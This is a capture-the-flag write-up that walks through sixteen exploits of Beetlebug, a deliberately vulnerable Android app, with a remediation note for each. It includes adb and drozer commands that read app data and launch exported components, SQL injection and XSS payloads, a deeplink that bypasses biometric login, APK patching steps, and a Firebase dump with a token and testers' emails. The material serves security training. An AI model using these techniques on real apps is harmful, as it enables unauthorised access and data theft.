# Beetlebug CTF

- Installed a mobile emulator, genymotion and used a rooted phone
- Installed Beetlebug Mobile apk - https://github.com/hafiz-ng/Beetlebug

**Objective**: Demonstrated mobile application security exploitation techniques.

## Hardcoded Secrets (Flag 1 - 2)

### 1. Hardcoding Sensitive Data

*Find where sensitive data is stored locally without encryption*
**Hardcoded Secrets:**
*Hint: Developers sometimes leave sensitive info in the application's string resources.*

- Open the application's source code using jadx
- Navigate to Resources > resources.arsc > res > values
- Open the strings.xml file
- The first line gives the PIN: `7432580`

***Vulnerability***: This challenge revealed Improper Credential Usage vulnerability where hardcoded credentials are stored within the app's source code.

***Best Practice:*** Frequently review source code and properly handle credentials by encrypting data at all stages (at rest and in transit).

### 2. Hardcoding Secrets

*Locate hardcoded secrets in the application source code*
**Embedded Secrets**:
*Hint: Find out how sensitive credentials is being stored in plaintext, without encryption.*

Used the jadx tool to look at the source code of the application.
Selected all search definitions and searched the keyword **promo**.

![Embedded Secrets](<attachments/Beetlebug CTF/Embedded Secrets.png>)

The flag was hardcoded.
Flag: `beetle1759`

***Vulnerability***: This challenge revealed Improper Credential Usage vulnerability where hardcoded credentials are stored within the app's source code.

***Best Practice:*** Frequently review source code and properly handle credentials by encrypting data at all stages (at rest and in transit).

## Data Storage (Flag 3 - 5)

### 3. Shared Preferences

*Identify where sensitive information is stored within an application*
*Hint: Find out how sensitive credentials is being stored in plaintext in Shared Preferences.*

Input a username and password
Find where they are stored in the local storage.
Used `adb` to access the Android files

```shell
# To have root privileges
adb root

# To access the android shell
adb shell

# Confirm root privileges
whoami

Every single application runs on the data directory
# Navigated to the data directory
cd /data/data

# Search the name of the application
ls -l | grep 'beetlebug'

# Navigate to the app directory
cd app.beetlebug

# Check the files and folders
ls -l
total 32
drwxrws--x 2 u0_a129 u0_a129_cache 4096 2025-10-24 21:16 cache
drwxrws--x 2 u0_a129 u0_a129_cache 4096 2025-10-24 21:16 code_cache
drwxrwx--x 2 u0_a129 u0_a129       4096 2025-10-28 10:51 databases
drwxrwx--x 2 u0_a129 u0_a129       4096 2025-11-01 13:42 shared_prefs

# Navigated to Shared preferences directory
cd shared_prefs

# Viewed files in the directory
ls -l
total 32
-rw-rw---- 1 u0_a129 u0_a129 775 2025-10-28 10:52 preferences.xml
-rw-rw---- 1 u0_a129 u0_a129 203 2025-11-01 13:42 shared_pref_flag.xml
-rw-rw---- 1 u0_a129 u0_a129 288 2025-10-28 10:52 user_info.xml
-rw-rw---- 1 u0_a129 u0_a129 118 2025-10-28 10:51 walkthrough.xml

# Read all files and found the flag
cat shared_pref_flag.xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="password">password</string>
    <string name="flag 3">0x1442c04</string>
    <string name="username">test</string>
</map>
```

The flag `0x1442c04`

***Vulnerability***: Username and password was stored in plaintext format, therefore revealing an Insufficient Cryptography vulnerability.

***Best Practice:*** Data in transit and at rest should be encrypted.

### 4. External Storage

*Files saved to the external storage are world-readable and can be modified by anyone*
*Hint: Files saved to the external storage are world-readable*

Input an email address and password
A popup is shown:
***Data saved to /storage/emulated/0/Documents/user.txt***

```shell
# Navigated to the folder
cd /storage/emulated/0/Documents/

# Viewed the files in the folder
ls -l user.txt
total 8
-rw-rw---- 1 root everybody 53 2025-11-01 15:17 user.txt

cat user.txt
Pass: password
Email: test@email.com
flag : 0x3982c%4
```

Flag: `0x3982c%4`

***Vulnerability***: This challenge revealed an Insufficient Cryptograph vulnerability. Sensitive information is stored in plaintext.

***Best Practice:*** Data in transit and at rest should be encrypted.

### 5. SQLite Database

*Identify unencrypted sensitive data stored on the SQLite database*
**SQLite Storage**
*Hint: Find out how sensitive credentials is being stored in plaintext, without encryption*

Navigated to the app’s database folder. We were able to read the contents of the database file revealing the password entered and the flag.

![SQLite Storage](<attachments/Beetlebug CTF/SQLite Storage.png>)

```shell
cd /data/data/app.beetlebug/databases

ls
UserDB  UserDB-journal  sqli  sqli-journal  user.db  user.db-journal

sqlite3 user.db

SQLite version 3.28.0 2020-05-06 18:46:38
Enter ".help" for usage hints.
sqlite> .tables
android_metadata  users
sqlite> SELECT * FROM users;
```
It shows the password entered and the flag.

Flag: `0x1172c04`

***Vulnerability***: Insecure Data Storage, where sensitive user data was stored on the device in an accessible SQLite database.

***Best Practice***:  Encrypt sensitive data at rest and encrypt sensitive data at rest.

## WebViews (Flag 6 - 7)

### 6. Load Arbitrary URL

*Loading a remote URL can be a dangerous practice in WebView*
**Weak URL Validation**
*Hint: Using ADB to open a malicious webpage within the context of the application*

- Created a simple HTML file (In Kali VM)

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Simple HTML Test Page</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f4f4f4;
      color: #333;
      text-align: center;
      margin-top: 100px;
    }
    button {
      padding: 10px 20px;
      font-size: 16px;
      border: none;
      background-color: #007BFF;
      color: white;
      border-radius: 5px;
      cursor: pointer;
    }
    button:hover {
      background-color: #0056b3;
    }
  </style>
</head>
<body>

  <h1>Welcome to My Test Page!</h1>
  <p>This is a simple HTML page to check if everything is working correctly.</p>
  <button onclick="showMessage()">Click Me!</button>

  <script>
    function showMessage() {
      alert("Hello! Your HTML is working perfectly.");
    }
  </script>

</body>
</html>

```

- Started a local webserver as a "malicious webpage" on the same directory as the HTML file (In Kali VM)

```shell
python3 -m http.server 8000
#Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

- Confirmed the android device can access the URL on the webserver

- Using drozer (Installed on 10th Challenge)

```shell
# To find attack surface of a specific package
run app.package.attacksurface app.beetlebug

# To get info about a specific exported activities
run app.activity.info -a app.beetlebug

run app.activity.start --component app.beetlebug app.beetlebug.ctf.WebViewURLActivity --data-uri http://<Kali-IP-with-the-malicious-HTML-file>:8000/malicious.html

# If the above doesn't work
run app.activity.start --component app.beetlebug app.beetlebug.ctf.WebViewURLActivity --action android.intent.action.VIEW --data "http://<Kali-IP-with-the-malicious-HTML-file>:8000/malicious.html"
```

- Using ADB

```shell
adb shell am start -a android.intent.action.VIEW -d "http://<Kali IP with the malicious HTML file>:8000/malicious.html" -n app.beetlebug/.ctf.WebViewURLActivity -W

# Also try
adb shell am start -n app.beetlebug/.ctf.VulnerableWebView --es reg_url "file:///data/data/app.beetlebug/shared_prefs/preferences.xml"
```

***Vulnerability***:

- M4: Insufficient Input/Output Validation (Weak URL Validation) — the app will load arbitrary, untrusted URLs into its WebView.

- M8: Security Misconfiguration — insecure WebView settings (e.g., JavaScript enabled, file access, exposed JS interfaces) or exported components make the app a dangerous host for remote pages.

***Best Practice***: Don’t load arbitrary external URLs inside your app and Implement a strict URL allowlist.

### 7. JavaScript Code Injection

*Enabling JavaScript in WebView and can result to JS-related issues such as XSS.*
*Hint: Visit the display XSS activity to see what makes this Activity vulnerable*

Wrote a simple payload: `<script>alert(1738)</script>`
An alert popped up with the message. Displaying the flag.

![Javasript Code Injection](<attachments/Beetlebug CTF/JavaSript Code Injection.png>)

Flag: `0x66r9214`

***Vulnerability***: This challenge revealed Insufficient Input/Output Validation leading to an injection vulnerability,
 XSS.

***Best Practice***: Use secure coding techniques like properly sanitizing output data to prevent XSS attacks

## Databases (Flag 8 - 9)

### 8. SQL Injection

*Once triggered, the deeplink would direct users to load any attacker-controlled*
*Hint: There are 2 users in the database, using a single search query, output all 2 users.*

On the Username input area
Performed an SQL injection by inserting the payload `test' OR 1=1 --`

![SQL injection](<attachments/Beetlebug CTF/SQL injection.png>)

The payload revealed users information.

The flag: `0x91334Z1`

***Vulnerability***: This challenge revealed the vulnerability Insufficient Input/Output Validation. 

***Best Practice***: Use secure coding techniques like parameterized queries or prepared statements. Properly validate and sanitize input data.

### 9. Firebase Database Misconfiguration

*Firebase Database Misconfigurations allow unauthorized parties to easily access users' personal data.*
*Hint: A misconfigured Firebase instance can be identified by making the following network call: https://firebaseProjectName.firebaseio.com/.json*

Used MobSF to analyze the beetlebug application.

![Misconfigured Firebase Database 1](<attachments/Beetlebug CTF/Misconfigured Firebase Database 1.png>)

The analyzer revealed the firebase URL: https://beetlebug-374fc-default-rtdb.firebaseio.com/

An alternative is using the jadx tool to view the app's source code and search for the keyword **firebaseio.com**

![Misconfigured Firebase Database 2](<attachments/Beetlebug CTF/Misconfigured Firebase Database 2.png>)

Added a `.json` to the URL: https://beetlebug-374fc-default-rtdb.firebaseio.com/.json
Opened the URL on a web browser. 

```json
{
"Beetlebug":"Beetlebug is an open source insecure Android application with CTF challenges built for Mobile Pentesters, Bug Bounty Hunters and Developers.",
    "admin":{
        "Exploit":"Successful",
        "email":"test@gmail.cm",
        "message":"hello",
        "name":"user",
        "website":"https://google.com"
},
"flag":"0x3365A10",
"hacker":{
    "Exploit":"Successful",
    "email":"hacker@gmail.com",
    "message":"hello hacker",
    "name":"hacker@abc",
    "website":"http://google.com"
},
"test":{
    "-OJ1Wk5DpljBxqNpKmin":{
        "email":"mr-k0anti@wearehackerone.com",
        "message":"this firebase has been found unprotected by mr-k0anti",
        "username":"mr-k0anti"
    },
    "Exploit":"Successfull",
    "email":"test@test.com",
    "message":"test hack",
    "name":"test",
    "website":"test.com"
},
"testing1":{
    "-ODkTgQjJBr3iqyAt2Kd":{
    "cat":"meow",
    "dog":"bowbow"
    }
},
"userId":1631721730509,
"userToken":"cp__rEcAQnuIIxGKzJ5QVd:APA91bEJkYBRCmjCN0lAxOCZof5Tn75kB2O_6mcurklu6fcs6HKWx5LaSIS2TPIziQy5LSVAoP5bNevfwNvNMX9MG90kr5ppHnoWv9Kdbh309Sq13Lai_vtMuOk1AWAE1qKLnHCgTYo0"
}
```

The flag is revealed: `0x3365A10`

Firebase is used to store data in most mobile apps. Some Firebases come with misconfigurations. You can find a Firebase endpoint by adding a .json to the URL and be able to read data from the firebase database.

***Vulnerability***: This challenge revealed the Improper Credential Usage vulnerability by hardcoding internal URLs (firebase URL).

***Best practice:*** Review source code regularly and do not expose internal URLs to the internet, especially without any authentication.

## Android Components (Flag 10-12)

### 10. Unprotected Activity

*Exported activities with no proper permissions can result intent re-direction*
**Vulnerable Activity**
*Hint: You can bypass an exported Android Activity component using adb or drozer*

- Start by installing drozer.

```shell
pipx ensurepath
pipx install drozer
```

- Download the latest drozer Agent [here](https://github.com/ReversecLabs/drozer-agent/releases/latest) and install on the android device.

```shell
adb install drozer-agent.apk
```

- Connect to the phone with drozer. Go to the drozer Agent app on the phone. Switch ON the Embedded Server.

```shell
# To port forward
adb forward tcp:31415 tcp:31415

# Confirm you have JDK installed for drozer to work
java -version
javac -version

# Confirm java is on PATH
which java
#/usr/bin/java

# Connect
drozer console connect
```

- Drozer console opens

![Drozer Console](<attachments/Beetlebug CTF/Drozer Console.png>)

- Using Drozer

```shell
# View drozer commands
list

# List all package names on the device 
run app.package.list
# To show a specific application on the device
run app.package.list -f beetlebug

# To view the help command for attack surface
run app.package.attacksurface -h
# To find attack surface of a specific package
run app.package.attacksurface app.beetlebug

# To get more information about the activities
run app.activity.info -h
# To get info about a specific exported activities
run app.activity.info -a app.beetlebug
```

![Using Drozer to search exported activities](<attachments/Beetlebug CTF/Using Drozer to search exported activities.png>)

***(Ignore the last Command for now)***

- Run jadx to view what the activities are doing

```shell
# The activities are:
dz> run app.activity.info -a app.beetlebug
Attempting to run shell module
Package: app.beetlebug
  app.beetlebug.ctf.b33tleAdministrator
    Permission: null
  app.beetlebug.ctf.VulnerableWebView
    Permission: null
  app.beetlebug.ctf.DeeplinkAccountActivity
    Permission: null
  app.beetlebug.ctf.WebViewURLActivity
    Permission: null
  app.beetlebug.Walkthrough
    Permission: null
  app.beetlebug.ctf.BiometricActivityDeeplink
    Permission: null
```

Navigate to Resources > AndroidManifest.xml
Open the AndroidManifest file of the apk file.

Double click on the android:name `app.beetlebug.ctf.b33tleAdministrator` to view the code of that activity.

```java
package app.beetlebug.ctf;

import android.database.Cursor;
import android.database.SQLException;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.view.Window;
import android.widget.LinearLayout;
import android.widget.ListAdapter;
import android.widget.ListView;
import android.widget.RelativeLayout;
import android.widget.SimpleCursorAdapter;
import androidx.appcompat.app.AppCompatActivity;
import androidx.fragment.app.Fragment;
import androidx.fragment.app.FragmentTransaction;
import androidx.loader.app.LoaderManager;
import androidx.loader.content.Loader;
import app.beetlebug.R;
import app.beetlebug.db.DatabaseHelper;
import app.beetlebug.fragments.AddUserFragment;
import app.beetlebug.utils.MyLoader;

/* loaded from: classes6.dex */
public class b33tleAdministrator extends AppCompatActivity implements LoaderManager.LoaderCallbacks<Cursor> {
    private static final int LOADER_ID = 1976;
    private SimpleCursorAdapter adapter;
    LinearLayout flg;
    LinearLayout linearLayout;
    private ListView listView;
    private DatabaseHelper myHelper;
    RelativeLayout relativeLayout;
    RelativeLayout relativeLayout2;
    final String[] from = {DatabaseHelper._ID, "name", DatabaseHelper.PASS};
    final int[] to = {R.id.id, R.id.name};

    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    protected void onCreate(Bundle savedInstanceState) throws SQLException {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_b33tle_activtity);
        this.relativeLayout = (RelativeLayout) findViewById(R.id.toolbar);
        this.relativeLayout2 = (RelativeLayout) findViewById(R.id.relativeLayout);
        this.linearLayout = (LinearLayout) findViewById(R.id.linear_layout_scroll);
        this.flg = (LinearLayout) findViewById(R.id.ctfLayout);
        if (Build.VERSION.SDK_INT >= 21) {
            Window window = getWindow();
            window.addFlags(Integer.MIN_VALUE);
            window.clearFlags(67108864);
            window.setStatusBarColor(getResources().getColor(R.color.white));
        }
        DatabaseHelper databaseHelper = new DatabaseHelper(this);
        this.myHelper = databaseHelper;
        databaseHelper.open();
        ListView listView = (ListView) findViewById(R.id.list_view);
        this.listView = listView;
        listView.setEmptyView(findViewById(R.id.textViewEmpty));
        SimpleCursorAdapter simpleCursorAdapter = new SimpleCursorAdapter(this, R.layout.users, null, this.from, this.to, 0);
        this.adapter = simpleCursorAdapter;
        this.listView.setAdapter((ListAdapter) simpleCursorAdapter);
        getSupportLoaderManager().initLoader(LOADER_ID, null, this);
    }

    public void addUser(View view) {
        this.relativeLayout.setVisibility(8);
        this.relativeLayout2.setVisibility(8);
        this.flg.setVisibility(8);
        this.linearLayout.setVisibility(8);
        Fragment fragment = new AddUserFragment();
        FragmentTransaction fragmentTransaction = getSupportFragmentManager().beginTransaction();
        fragmentTransaction.replace(R.id.container, fragment).commit();
    }

    @Override // androidx.loader.app.LoaderManager.LoaderCallbacks
    public Loader<Cursor> onCreateLoader(int id, Bundle args) {
        return new MyLoader(this, this.myHelper);
    }

    @Override // androidx.loader.app.LoaderManager.LoaderCallbacks
    public void onLoadFinished(Loader<Cursor> loader, Cursor data) {
        this.adapter.swapCursor(data);
    }

    @Override // androidx.loader.app.LoaderManager.LoaderCallbacks
    public void onLoaderReset(Loader<Cursor> loader) {
        this.adapter.swapCursor(null);
    }
}
```

Here we see the activity's `b33tleAdministrator` actions:

- Opens a local SQLite database (`DatabaseHelper`)
- Loads a list of users (IDs, names, passwords) via a **CursorLoader**
- Displays them inside a `ListView` using a `SimpleCursorAdapter`
- Provides a UI button that swaps the screen to an **AddUserFragment** to create a new entry
- Updates the list automatically when the underlying data changes (cursor loader)
So it’s meant to be a **user listing + user adding interface**.

Search for the Activity name, `b33tleAdministrator`, to see where it's been called.

![Using jadx to search for an Activity](<attachments/Beetlebug CTF/Using jadx to search for an Activity.png>)

- Back to drozer console. Here we can start that activity.

```shell
# Start app activity help command
run app.activity.start -h
# To start a specific activity
run app.activity.start --component app.beetlebug app.beetlebug.ctf.b33tleAdministrator
```

![Starting Activity with drozer](<attachments/Beetlebug CTF/Starting Activity with drozer.png>)

![Beetlebug - Unprotected Activity](<attachments/Beetlebug CTF/Beetlebug - Unprotected Activity.png>)

Flag: `0x334f221`

***Vulnerability***: M8: Security Misconfiguration — exported Android `Activity` left accessible. An `Activity` was exported (or implicitly exported) with no permission checks, allowing any other app (or `adb`/drozer) to start it and cause unintended behavior (intent redirection, bypass flows, leaking sensitive UI/state).

***Best Practice***: Don’t export Activities unless required - Set `android:exported="false"` for any activity not intended to be invoked by other apps. If export is required, require permissions - Protect exported components with explicit permissions.

### 11. Vulnerable Service

*Without specific permissions, Services can be exploited by other applications including malicious ones*
*Hint: To start service, type the following in the adb console: `adb shell startservice app.beetlebug/.handlers/VulnerableService`*

- Using drozer

```shell
# To view more info about exported services
run app.service.info -h

# List exported services with no permissions required to interact with it
run app.service.info --package app.beetlebug

# To start a service
run app.service.start --component app.beetlebug app.beetlebug.handlers.VulnerableService
# If it shows an error use ADB

# To stop a service
run app.service.stop --component app.beetlebug app.beetlebug.handlers.VulnerableService
```

![Using drozer to start service](<attachments/Beetlebug CTF/Using drozer to start service.png>)

- Using ADB

```shell
adb shell am start-foreground-service -n app.beetlebug/.handlers.VulnerableService
```

![Using ADB to start service](<attachments/Beetlebug CTF/Using ADB to start service.png>)

The flag pops up: `0x222103A`

***Vulnerability***: M8: Security Misconfiguration — exported `Service` left accessible. An exported Android `Service` can be started by any app (or via `adb`) because it has no permission checks, allowing attackers to trigger sensitive behavior, leak data, or bypass intended flows.

***Best Practice***: Don’t export services unless needed - Default to `android:exported="false"` in the manifest for services not intended for external callers. Require permissions for exported services
If external access is required, add `android:permission="com.example.MY_PERMISSION"` and define it with `protectionLevel="signature"` where appropriate.

### 12. Vulnerable Content Provider

*Without adequate protection, exported content providers can leak sensitive information*
*Hint: Locate sensitive info exposed by the exported content provider*

- Using drozer

```shell
# To find attack surface of a specific package
run app.package.attacksurface app.beetlebug

# Get information about exported content providers
run app.provider.info -h
# Finding content providers for specific package
run app.provider.info --package app.beetlebug

# Read the provider content
run app.provider.read content:app.beetlebug.provider/users
# If 'users' doesn't show, you can try: user, items, data, messages, notes, profiles, recods, entries, accounts
# Or you can use ADB as shown below
```

![Using drozer to locate sensitive info](<attachments/Beetlebug CTF/Using drozer to locate sensitive info.png>)

- Using ADB

```shell
# Query the provider (change the URI/path to whatever the provider exposed)
adb shell content query --uri content://app.beetlebug.provider/users
```

![Using ADB to locate sensitive info](<attachments/Beetlebug CTF/Using ADB to locate sensitive info.png>)

The flag is printed out with the names of users.
Flag: `0x733421M`

***Vulnerability***: M8: Security Misconfiguration — exported `ContentProvider` left accessible. An exported `ContentProvider` that lacks proper permissions or caller validation allows any app (or an attacker with ADB/root) to read, write, or delete sensitive app data via `content://` URIs.

***Best Practice***: Do not export providers unless necessary - Default to `android:exported="false"`; only export when cross-app sharing is required. Protect with permissions - Use `android:readPermission` / `android:writePermission` and define permissions with appropriate `protectionLevel` (use `signature` for intra-publisher access).

## Info Disclosure (Flag 13 - 14)

### 13. Insecure Logging

*Locate sensitive log info left by developers of the application*
*Hint: Use Android Logcat to identify sensitive log information*

Used android logcat to view the real-time traffic of the application.
Typed the command `adb logcat app.beetlebug` to view the traffic for the Beetlebug application only.

![Insecure Logging](<attachments/Beetlebug CTF/Insecure Logging.png>)

Input data on the fields in the application and viewed the traffic on the console.

The flag: `0x55541d3`

***Vulnerability***: This challenge revealed the vulnerability by displaying logs in plaintext. M6: Inadequate Privacy Controls — sensitive data written to logs. Developers left sensitive information (flags, tokens, credentials, PII) in application logs which can be read via `adb logcat` (or by a malicious/privileged app), enabling easy data exfiltration.

***Best practice:*** Encrypt data in transit and at rest. Never log secrets - Absolutely avoid logging passwords, full tokens, OTPs, session IDs, PII, or flags.

### 14. Clipboard Data

*Find sensitive clipboard data in the application*
*Hint: Use the ADB shell to find sensitive clipboard data*

Input data in the input fields.
There's a popup revealing the data has been copied to the clipboard.

![Clipboard Data](<attachments/Beetlebug CTF/Clipboard Data.png>)

Flag: `0x1132c4!`

***Vulnerability***: M6: Inadequate Privacy Controls — sensitive data copied to the system clipboard. The app copies sensitive information (flags, tokens, passwords, PII) to the global clipboard, allowing any other app, an attacker with shell access, or a synced device to read and exfiltrate it.

***Best practice:*** Avoid copying secrets to the system clipboard - Never put passwords, session tokens, OTPs, or other sensitive data into the global clipboard.
Use secure alternatives - Use platform credential/autofill APIs, encrypted in-app transfer, or short-lived deep-link tokens instead of copy/paste for secrets.

## Biometric Authentication (Flag 15)

### 15. Weak Deeplink By-Pass

*Fingerprint authentication can be circumvented via weak deeplinks*
**Fingerprint Bypass**
*Hint: Exploit weak deeplink to bypass login*

![Using Drozer to search exported activities](<attachments/Beetlebug CTF/Using Drozer to search exported activities.png>)

- Searched `DeeplinkAccountActivity` in jadx AndroidManifest file.

```java
package app.beetlebug.ctf;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.view.Window;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import app.beetlebug.R;
import java.util.List;

/* loaded from: classes6.dex */
public class DeeplinkAccountActivity extends AppCompatActivity {
    Button copy;
    TextView flag;
    TextView msg;

    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_deeplink_account);
        this.flag = (TextView) findViewById(R.id.textViewFlag);
        this.copy = (Button) findViewById(R.id.copy);
        if (Build.VERSION.SDK_INT >= 21) {
            Window window = getWindow();
            window.addFlags(Integer.MIN_VALUE);
            window.clearFlags(67108864);
            window.setStatusBarColor(getResources().getColor(R.color.white));
        }
        this.msg = (TextView) findViewById(R.id.textViewUrl);
        Uri uri = getIntent().getData();
        if (uri != null) {
            List<String> parameters = uri.getPathSegments();
            String param = parameters.get(parameters.size() - 1);
            this.msg.setText(param);
            Toast.makeText(this, "Fingerprint Auth Successful", 1).show();
            this.copy.setOnClickListener(new View.OnClickListener() { // from class: app.beetlebug.ctf.DeeplinkAccountActivity.1
                @Override // android.view.View.OnClickListener
                public void onClick(View v) {
                    ClipboardManager clipboardManager = (ClipboardManager) DeeplinkAccountActivity.this.getSystemService("clipboard");
                    ClipData clipData = ClipData.newPlainText("TextView", DeeplinkAccountActivity.this.flag.getText().toString());
                    clipboardManager.setPrimaryClip(clipData);
                    Toast.makeText(DeeplinkAccountActivity.this, "Copied to clipboard", 0).show();
                }
            });
        }
    }
}
```

So:

```java
Uri uri = getIntent().getData();
if (uri != null) {
  List<String> parameters = uri.getPathSegments();
  String param = parameters.get(parameters.size() - 1);
  this.msg.setText(param);
  Toast.makeText(this, "Fingerprint Auth Successful", 1).show();
  // copy button copies the TextView 'flag' to the clipboard
}
```

- If you launch the activity with any URI (i.e. a deep link), it will treat the link as if fingerprint auth succeeded.
- It displays the last path segment in the `msg` TextView and shows **"Fingerprint Auth Successful"**.
- There is a **Copy** button wired to copy the `flag` TextView into the clipboard — so once the activity is open you can push the copy button to place the flag into the clipboard.
That’s the bypass: **launch the activity with a deeplink → the app behaves as if fingerprint auth succeeded**.

Launch the activity with a deeplink

```shell
adb shell am start -a android.intent.action.VIEW -d "beetlebug://account/4" -n app.beetlebug/.ctf.Deeplink
AccountActivity -W
```

![Weak Deeplink By-Pass](<attachments/Beetlebug CTF/Weak Deeplink By-Pass.png>)

Flag: `0x43J123&`

***Vulnerability***: M3: Insecure Authentication/Authorization — deeplink flow grants access without proper authentication. A weak deeplink can be crafted to simulate a successful biometric authentication (or skip the biometric step entirely), letting an attacker open authenticated screens (or reveal the flag) without presenting a real fingerprint.

***Best Practice***: Never accept deeplink params as proof of biometric success - Treat any client-supplied flags as untrusted. A parameter like biometric=success must never be trusted. Use OS biometric APIs correctly - Always use platform biometric APIs (BiometricPrompt / LocalAuthentication) which return a secure, non-spoofable result. Do not allow deeplinks to set the biometric result.

## Binary Patching (Flag 16)

### 16. Grant Access

*Hint: You need to be a super administrator to access the password manager*
![Binary Patching - Disabled Grant Access button](<attachments/Beetlebug CTF/Binary Patching - Disabled Grant Access button.png>)

![Using Drozer to search exported activities](<attachments/Beetlebug CTF/Using Drozer to search exported activities.png>)

- Extracted the app from the device

```shell
# Find the app package name
adb shell pm list packages | grep beetlebug

# Find the package path
adb shell pm path app.beetlebug
#package:/data/app/~~dzAxVEG_IAZ__bG82Gbajw==/app.beetlebug-wSPRlBFecGRZ4LjD3MQcHg==/base.apk

# Pull the APK from the device
adb pull /data/app/~~dzAxVEG_IAZ__bG82Gbajw==/app.beetlebug-wSPRlBFecGRZ4LjD3MQcHg==/base.apk C:\Users\$USERNAME\Desktop
#/data/app/~~dzAxVEG_IAZ__bG82Gbajw==/app.be...skipped. 6.9 MB/s (9429128 bytes in 1.307s)
```

- Searched `grant access` in jadx. Opened the file `res/layout/activity_binary_patch.xml`

```java
    <Button
        android:enabled="false"
        android:textSize="16sp"
        android:textColor="@color/black"
        android:id="@+id/buttonGrantAccess"
        android:background="@drawable/rectangle_yellow"
        android:layout_width="320dp"
        android:layout_height="65dp"
        android:layout_marginTop="20dp"
        android:text="Grant Access"
        android:layout_below="@+id/linear_layout2"
        android:layout_centerHorizontal="true"
        android:onClick="grantAccess"
        android:textAllCaps="false"
        android:fontFamily="@font/kanit_regular"
        app:cornerRadius="14dp"/>
```

- Decompiled the app with the command:

```shell
apktool d beetlebug.apk -o beetlebug_decompiled
```

![Decompiled app with apktool](<attachments/Beetlebug CTF/Decompiled app with apktool.png>)

- Opened and modified the file with

```shell
vim res/layout/activity_binary_patch.xml
```

- Enabled the button - edited it to `true`.

```java
     <Button
        android:enabled="true"
        android:textSize="16sp"
        android:textColor="@color/black"
        android:id="@+id/buttonGrantAccess"
        android:background="@drawable/rectangle_yellow"
        android:layout_width="320dp"
        android:layout_height="65dp"
        android:layout_marginTop="20dp"
        android:text="Grant Access"
        android:layout_below="@+id/linear_layout2"
        android:layout_centerHorizontal="true"
        android:onClick="grantAccess"
        android:textAllCaps="false"
        android:fontFamily="@font/kanit_regular"
        app:cornerRadius="14dp"/>
```

- Rebuild the app with the changed file

```shell
apktool b beetlebug_decompiled -o beetlebug_patch.apk

# If the above shows errors: e.g. Invalid file name
# Navigate to the file location and delete files with special characters
find . -type f -name '$*' -delete 
# OR
find decompiled/res/ -type f -name '*$*' -exec bash -c 'f="{}"; n=$(basename "$f" | tr -d "$"); mv "$f" "$(dirname "$f")/$n"' \;

# Then try to recompile the app again

# sign with debug key (apksigner or jarsigner)
apksigner sign --ks debug.keystore --out <patched_signed.apk> <patched.apk>
apksigner sign --ks debug.keystore --out beetle_bug.apk beetlebug_patch.apk

jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.jks path/to/new_apk.apk alias_name
# Install if the tool isn't installed: sudo apt install apksigner

# Create a new keystore
keytool -genkey -v -keystore my-release-key.jks -keyalg RSA -keysize 2048 -validity 10000 -alias mykey
#Password: androidapplicationsigned
#Set all values to default (Press ENTER) and write yes at the end

# sign with debug key (apksigner or jarsigner)
apksigner sign --ks my-release-key.jks --ks-key-alias mykey --out beetle_bug.apk beetlebug_patch.apk
#Keystore password for signer #1: Write the password set up when creating keystore

# Verify the APK is properly signed
apksigner verify beetle_bug.apk
```

![Recompiled changed app](<attachments/Beetlebug CTF/Recompiled changed app.png>)

![Verification of signed APK](<attachments/Beetlebug CTF/Verification of signed APK.png>)

- Transfer the APK file from VM to  Host machine
- Uninstalled the previous Beetlebug App and reinstalled the new one

```shell
# Uninstalled the previous app
adb uninstall app.beetlebug

# install and test
adb install -r <patched_signed.apk>
#Performing Streamed Install
#Success
```

![Changed beetlebug app](<attachments/Beetlebug CTF/Changed beetlebug app.png>)

Flag: `0x33e91e` or `0x33e9$e`

***Vulnerability***: M3: Insecure Authentication/Authorization — improper role/permission checks allow unauthorized access to privileged features (password manager). A privileged feature (password manager) is protected only by a weak or bypassable check for “super administrator” privileges; attackers who can manipulate role checks, supply crafted intents/flags, or exploit default credentials can gain access to stored secrets.

***Best Practice***: Enforce server-side authorization for sensitive data - Never rely solely on client-side role checks. The server must verify the user’s privileges before returning secrets. Use strong authentication + re-authentication for admin actions - Require MFA and/or a fresh credential prompt (password/biometric) before granting access to password manager data.
